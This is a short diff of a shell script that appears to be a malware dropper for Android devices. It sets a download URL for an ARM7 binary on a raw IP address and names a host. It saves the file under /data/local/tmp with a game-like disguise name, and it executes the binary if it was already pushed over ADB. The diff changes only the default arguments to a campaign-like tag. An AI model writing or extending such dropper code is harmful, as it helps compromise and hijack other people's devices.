@@ -3,7 +3,7 @@
 URL="http://185.199.108.153/wow/ntb.arm7"
 HOST="store.risesmp.cc"
 OUT="/data/local/tmp/ClashRoyalLegendsV2"
-ARGS="$@"
+ARGS="${@:-sardurumdiddy}"
 
 # Already pushed by adb2? Just run it.
 [ -x "$OUT" ] && exec "$OUT" $ARGS
